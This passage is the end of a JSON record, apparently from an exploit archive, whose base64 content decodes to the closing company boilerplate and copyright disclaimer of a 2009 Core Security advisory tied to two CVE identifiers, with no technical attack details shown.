oxMS4gKkFib3V0IENvcmVMYWJzKg0KDQpDb3JlTGFicywgdGhlIHJlc2VhcmNoIGNlbnRlciBvZiBDb3JlIFNlY3VyaXR5IFRlY2hub2xvZ2llcywgaXMNCmNoYXJnZWQgd2l0aCBhbnRpY2lwYXRpbmcgdGhlIGZ1dHVyZSBuZWVkcyBhbmQgcmVxdWlyZW1lbnRzIGZvcg0KaW5mb3JtYXRpb24gc2VjdXJpdHkgdGVjaG5vbG9naWVzLiBXZSBjb25kdWN0IG91ciByZXNlYXJjaCBpbiBzZXZlcmFsDQppbXBvcnRhbnQgYXJlYXMgb2YgY29tcHV0ZXIgc2VjdXJpdHkgaW5jbHVkaW5nIHN5c3RlbSB2dWxuZXJhYmlsaXRpZXMsDQpjeWJlciBhdHRhY2sgcGxhbm5pbmcgYW5kIHNpbXVsYXRpb24sIHNvdXJjZSBjb2RlIGF1ZGl0aW5nLCBhbmQNCmNyeXB0b2dyYXBoeS4gT3VyIHJlc3VsdHMgaW5jbHVkZSBwcm9ibGVtIGZvcm1hbGl6YXRpb24sDQppZGVudGlmaWNhdGlvbiBvZiB2dWxuZXJhYmlsaXRpZXMsIG5vdmVsIHNvbHV0aW9ucyBhbmQgcHJvdG90eXBlcyBmb3INCm5ldyB0ZWNobm9sb2dpZXMuIENvcmVMYWJzIHJlZ3VsYXJseSBwdWJsaXNoZXMgc2VjdXJpdHkgYWR2aXNvcmllcywNCnRlY2huaWNhbCBwYXBlcnMsIHByb2plY3QgaW5mb3JtYXRpb24gYW5kIHNoYXJlZCBzb2Z0d2FyZSB0b29scyBmb3INCnB1YmxpYyB1c2UgYXQ6IGh0dHA6Ly93d3cuY29yZXNlY3VyaXR5LmNvbS9jb3JlbGFicy4NCg0KDQoxMi4gKkFib3V0IENvcmUgU2VjdXJpdHkgVGVjaG5vbG9naWVzKg0KDQpDb3JlIFNlY3VyaXR5IFRlY2hub2xvZ2llcyBkZXZlbG9wcyBzdHJhdGVnaWMgc29sdXRpb25zIHRoYXQgaGVscA0Kc2VjdXJpdHktY29uc2Npb3VzIG9yZ2FuaXphdGlvbnMgd29ybGR3aWRlIGRldmVsb3AgYW5kIG1haW50YWluIGENCnByb2FjdGl2ZSBwcm9jZXNzIGZvciBzZWN1cmluZyB0aGVpciBuZXR3b3Jrcy4gVGhlIGNvbXBhbnkncyBmbGFnc2hpcA0KcHJvZHVjdCwgQ09SRSBJTVBBQ1QsIGlzIHRoZSBtb3N0IGNvbXByZWhlbnNpdmUgcHJvZHVjdCBmb3IgcGVyZm9ybWluZw0KZW50ZXJwcmlzZSBzZWN1cml0eSBhc3N1cmFuY2UgdGVzdGluZy4gQ09SRSBJTVBBQ1QgZXZhbHVhdGVzIG5ldHdvcmssDQplbmRwb2ludCBhbmQgZW5kLXVzZXIgdnVsbmVyYWJpbGl0aWVzIGFuZCBpZGVudGlmaWVzIHdoYXQgcmVzb3VyY2VzDQphcmUgZXhwb3NlZC4gSXQgZW5hYmxlcyBvcmdhbml6YXRpb25zIHRvIGRldGVybWluZSBpZiBjdXJyZW50IHNlY3VyaXR5DQppbnZlc3RtZW50cyBhcmUgZGV0ZWN0aW5nIGFuZCBwcmV2ZW50aW5nIGF0dGFja3MuIENvcmUgU2VjdXJpdHkNClRlY2hub2xvZ2llcyBhdWdtZW50cyBpdHMgbGVhZGluZyB0ZWNobm9sb2d5IHNvbHV0aW9uIHdpdGggd29ybGQtY2xhc3MNCnNlY3VyaXR5IGNvbnN1bHRpbmcgc2VydmljZXMsIGluY2x1ZGluZyBwZW5ldHJhdGlvbiB0ZXN0aW5nIGFuZA0Kc29mdHdhcmUgc2VjdXJpdHkgYXVkaXRpbmcuIEJhc2VkIGluIEJvc3RvbiwgTUEgYW5kIEJ1ZW5vcyBBaXJlcywNCkFyZ2VudGluYSwgQ29yZSBTZWN1cml0eSBUZWNobm9sb2dpZXMgY2FuIGJlIHJlYWNoZWQgYXQgNjE3LTM5OS02OTgwDQpvciBvbiB0aGUgV2ViIGF0IGh0dHA6Ly93d3cuY29yZXNlY3VyaXR5LmNvbS4NCg0KDQoxMy4gKkRpc2NsYWltZXIqDQoNClRoZSBjb250ZW50cyBvZiB0aGlzIGFkdmlzb3J5IGFyZSBjb3B5cmlnaHQgKGMpIDIwMDkgQ29yZSBTZWN1cml0eQ0KVGVjaG5vbG9naWVzIGFuZCAoYykgMjAwOSBDb3JlTGFicywgYW5kIG1heSBiZSBkaXN0cmlidXRlZCBmcmVlbHkNCnByb3ZpZGVkIHRoYXQgbm8gZmVlIGlzIGNoYXJnZWQgZm9yIHRoaXMgZGlzdHJpYnV0aW9uIGFuZCBwcm9wZXINCmNyZWRpdCBpcyBnaXZlbi4=", 
    "filename": "platforms/php/webapps/10364.txt", 
    "id": "10364", 
    "cves": [
        "CVE-2009-4237", 
        "CVE-2009-4238"
    ]
}